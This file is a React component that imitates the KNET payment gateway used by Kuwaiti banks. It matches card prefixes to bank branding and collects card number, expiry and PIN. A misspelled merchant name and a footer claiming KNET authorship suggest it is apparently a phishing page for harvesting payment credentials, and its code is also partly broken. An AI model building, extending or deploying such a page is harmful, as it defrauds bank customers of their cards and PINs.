'use client';

import React, { useState, useRef, useMemo } from 'react';

interface Bank {
  name: string;
  nameAr: string;
  bins: string[];
  color: string;
  logo: string;
}

const KUWAITI_BANKS: Bank[] = [
  {
    name: 'Warba Bank',
    nameAr: 'بنك ورقة',
    bins: ['422220', '422260', '428628'],
    color: '#2b6fb3',
    logo: '🏦',
  },
  {
    name: 'National Bank of Kuwait',
    nameAr: 'البنك الوطني الكويتي',
    bins: ['402896', '403622'],
    color: '#1a4d2e',
    logo: '🏦',
  },
  {
    name: 'Kuwait Finance House',
    nameAr: 'بيت التمويل الكويتي',
    bins: ['423826', '484611'],
    color: '#c70000',
    logo: '🏦',
  },
  {
    name: 'Commercial Bank of Kuwait',
    nameAr: 'البنك التجاري الكويتي',
    bins: ['428614', '428617'],
    color: '#003d82',
    logo: '🏦',
  },
  {
    name: 'Gulf Bank',
    nameAr: 'بنك الخليج',
    bins: ['415189', '429584'],
    color: '#009688',
    logo: '🏦',
  },
  {
    name: 'Bank of Bahrain and Kuwait',
    nameAr: 'بنك البحرين والكويت',
    bins: ['429587', '429588'],
    color: '#0066cc',
    logo: '🏦',
  },
  {
    name: 'Ahli United Bank',
    nameAr: 'بنك الأهلي المتحد',
    bins: ['428619', '425000'],
    color: '#d32f2f',
    logo: '🏦',
  },
  {
    name: 'FAB - First Abu Dhabi Bank',
    nameAr: 'بنك أبو ظبي الأول',
    bins: ['428623', '411111'],
    color: '#003d82',
    logo: '🏦',
  },
  {
    name: 'Burgan Bank',
    nameAr: 'بنك برقان',
    bins: ['428625', '428626'],
    color: '#f39c12',
    logo: '🏦',
  },
];

interface PaymentFormProps {
  amount: string;
  onSubmit: (cardData: any) => void;
  isLoading?: boolean;
}

export default function KNetPaymentForm({
  amount,
  onSubmit,
  isLoading = false,
}: PaymentFormProps) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [pin, setPin] = useState('');
  const [showDropdown, setShowDropdown] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  // Detect bank from card number BIN
  const detectedBank = useMemo(() => {
    if (!cardNumber) return null;
    
    // Try to match with exact BIN lengths first, then progressively shorter
    for (let binLength = 6; binLength >= 3; binLength--) {
      const checkDigits = cardNumber.substring(0, binLength);
      if (checkDigits.length < binLength) break;
      
      for (const bank of KUWAITI_BANKS) {
        for (const bin of bank.bins) {
          if (bin.substring(0, binLength) === checkDigits) {
            return bank;
          }
        }
      }
    }
    return null;
  }, [cardNumber]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit({
      cardNumber,
      expiry,
      pin,
      bank: detectedBank?.name || 'Unknown',
    });
  };

  return (
    <div style={styles.container}>
      {/* Top Banner */}
      <div style={styles.banner}>
        <div style={styles.bannerTitle}>زكــن على رؤيـــة</div>
        <div style={styles.bannerSubtitle}>الاحتيال له عدة أشكال وأنواع</div>
      </div>

      {/* Merchant Section */}
      <div style={styles.panel}>
        <div style={{ ...styles.bankHeader, borderColor: detectedBank?.color || '#2b6fb3' }}>
          <div style={{ ...styles.bankName, color: detectedBank?.color || '#2b6fb3' }}>
            {detectedBank?.nameAr || 'بنك ورقة'}
          </div>
          <div style={{ ...styles.bankEnglish, color: detectedBank?.color || '#2b6fb3' }}>
            {detectedBank?.name || 'WARBA BANK'}
          </div>
        </div>

        <div style={styles.infoRow}>
          <span style={styles.label}>Merchant:</span>
          <span style={styles.value}>Myfatoorah General Trading Co. (Myfatoorash)</span>
        </div>
        <div style={styles.divider}></div>

        <div style={styles.infoRow}>
          <span style={styles.label}>Amount:</span>
          <span style={styles.value}>KD {amount}</span>
        </div>
      </div>

      {/* Payment Form */}
      <div style={styles.panel}>
        {/* Card Number Section */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>Card Number:</label>
          <input
            type="text"
            placeholder="4"
            value={cardNumber}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '');
              setCardNumber(value);
            }}
            style={styles.cardNumberInput}
            maxLength={16}
            inputMode="numeric"
          />
        </div>

        <div style={styles.divider}></div>

        {/* Expiration Date */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>Expiration Date:</label>
          <input
            type="text"
            placeholder="MM/YY"
            value={expiry}
            onChange={(e) => setExpiry(e.target.value)}
            style={styles.input}
            maxLength={5}
          />
        </div>

        <div style={styles.divider}></div>

        {/* PIN */}
        <div style={styles.formGroup}>
          <label style={styles.fieldLabel}>PIN:</label>
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            style={styles.input}
            maxLength={4}
          />
        </div>
      </div>

      {/* Buttons */}
      <div style={styles.panel}>
        <div style={styles.buttonGroup}>
          <button
            onClick={handleSubmit}
            disabled={isLoading}
            style={styles.submitButton}
          >
            Submit
          </button>
          <button
            type="button"
            style={styles.cancelButton}
            onClick={() => {
              setCardNumber('');
              setExpiry('');
              setPin('');
              setSelectedCard(null);
              setShowDropdown(false);
            }}
          >
            Cancel
          </button>
        </div>
      </div>

      {/* Footer */}
      <div style={styles.footer}>
        <p style={styles.footerText}>All Rights Reserved. Copyright 2026 ©</p>
        <p style={styles.knetText}>
          The Shared Electronic Banking Services Company - KNET
        </p>
      </div>
    </div>
  );
}

const styles: { [key: string]: React.CSSProperties } = {
  container: {
    maxWidth: '500px',
    margin: '0 auto',
    padding: '12px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
    backgroundColor: '#f5f5f5',
  },
  banner: {
    backgroundColor: '#5b8db5',
    color: '#fff',
    padding: '16px',
    borderRadius: '12px',
    textAlign: 'center',
    marginBottom: '16px',
  },
  bannerTitle: {
    fontSize: '20px',
    fontWeight: 'bold',
    direction: 'rtl' as const,
    marginBottom: '4px',
  },
  bannerSubtitle: {
    fontSize: '14px',
    direction: 'rtl' as const,
  },
  panel: {
    backgroundColor: '#fff',
    borderRadius: '16px',
    padding: '16px',
    marginBottom: '12px',
    boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
  },
  bankHeader: {
    display: 'flex',
    flexDirection: 'column' as const,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: '16px',
    paddingBottom: '12px',
    borderBottom: '2px solid #f0f0f0',
  },
  bankName: {
    fontSize: '20px',
    fontWeight: 'bold',
    color: '#2b6fb3',
    marginBottom: '4px',
  },
  bankEnglish: {
    fontSize: '14px',
    color: '#2b6fb3',
    fontWeight: '600',
  },
  infoRow: {
    display: 'flex' as const,
    justifyContent: 'space-between' as const,
    alignItems: 'center' as const,
    marginBottom: '12px',
    fontSize: '14px',
  },
  label: {
    fontWeight: 'bold',
    color: '#2b6fb3',
    minWidth: '100px',
  },
  value: {
    color: '#333',
    textAlign: 'right' as const,
    flex: 1,
  },
  divider: {
    height: '1px',
    backgroundColor: '#e0e0e0',
    margin: '12px 0',
  },
  formGroup: {
    marginBottom: '12px',
  },
  fieldLabel: {
    display: 'block',
    fontWeight: 'bold',
    color: '#2b6fb3',
    marginBottom: '6px',
    fontSize: '14px',
  },
  cardDropdownWrapper: {
    position: 'relative' as const,
  },
  cardNumberInput: {
    width: '100%',
    padding: '10px',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontSize: '14px',
    backgroundColor: '#f8f8f8',
    boxSizing: 'border-box' as const,
  },
  cardDropdown: {
    position: 'absolute' as const,
    top: '100%',
    left: 0,
    right: 0,
    backgroundColor: '#fff',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    marginTop: '2px',
    boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
    zIndex: 100,
  },
  cardOption: {
    padding: '10px 12px',
    borderBottom: '1px solid #f0f0f0',
    display: 'flex' as const,
    justifyContent: 'space-between' as const,
    alignItems: 'center' as const,
    cursor: 'pointer',
    fontSize: '13px',
    color: '#333',
  },
  bankIcon: {
    fontSize: '12px',
    color: '#2b6fb3',
  },
  input: {
    width: '100%',
    padding: '10px',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontSize: '14px',
    backgroundColor: '#f8f8f8',
    boxSizing: 'border-box' as const,
  },
  buttonGroup: {
    display: 'flex' as const,
    gap: '12px',
    marginTop: '8px',
  },
  submitButton: {
    flex: 1,
    padding: '12px',
    backgroundColor: '#e8e8e8',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontWeight: '600',
    fontSize: '14px',
    cursor: 'pointer',
    color: '#333',
  },
  cancelButton: {
    flex: 1,
    padding: '12px',
    backgroundColor: '#e8e8e8',
    border: '1px solid #d0d0d0',
    borderRadius: '6px',
    fontWeight: '600',
    fontSize: '14px',
    cursor: 'pointer',
    color: '#333',
  },
  footer: {
    textAlign: 'center' as const,
    fontSize: '12px',
    color: '#666',
    marginTop: '24px',
    paddingBottom: '20px',
  },
  footerText: {
    margin: '0 0 4px 0',
  },
  knetText: {
    color: '#2b6fb3',
    fontWeight: '600',
    margin: '4px 0 0 0',
  },
};
